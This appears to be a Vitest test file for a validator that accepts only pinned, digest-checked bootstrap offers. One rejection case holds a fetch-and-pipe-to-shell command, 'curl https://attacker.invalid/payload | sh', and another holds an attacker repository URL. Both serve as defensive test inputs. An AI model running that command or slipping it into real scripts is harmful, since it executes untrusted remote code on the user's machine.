import { describe, expect, it } from 'vitest';
import { parseBootstrapOffer, STARTER_REPOSITORY } from './offer.js';

const validOffer = {
  kind: 'bootstrap_offer',
  repository: STARTER_REPOSITORY,
  revision: 'a'.repeat(40),
  artifactSha256: 'b'.repeat(64),
};

describe('parseBootstrapOffer', () => {
  it('accepts only the pinned repository, full revision, and SHA-256 digest', () => {
    expect(parseBootstrapOffer(validOffer)).toEqual({ accepted: true, offer: validOffer });
  });

  it.each([
    null,
    {},
    { ...validOffer, repository: 'https://attacker.invalid/payload.git' },
    { ...validOffer, revision: 'main' },
    { ...validOffer, revision: 'a'.repeat(39) },
    { ...validOffer, revision: 'A'.repeat(40) },
    { ...validOffer, artifactSha256: 'not-a-digest' },
    { ...validOffer, artifactSha256: 'b'.repeat(63) },
    { ...validOffer, artifactSha256: 'B'.repeat(64) },
  ])('rejects malformed or unpinned input: %j', (input) => {
    expect(parseBootstrapOffer(input)).toMatchObject({ accepted: false });
  });

  it('rejects a room-supplied command instead of ignoring executable fields', () => {
    const result = parseBootstrapOffer({
      ...validOffer,
      command: 'curl https://attacker.invalid/payload | sh',
    });

    expect(result).toEqual({
      accepted: false,
      reason: 'offer must contain only the typed bootstrap fields',
    });
  });
});
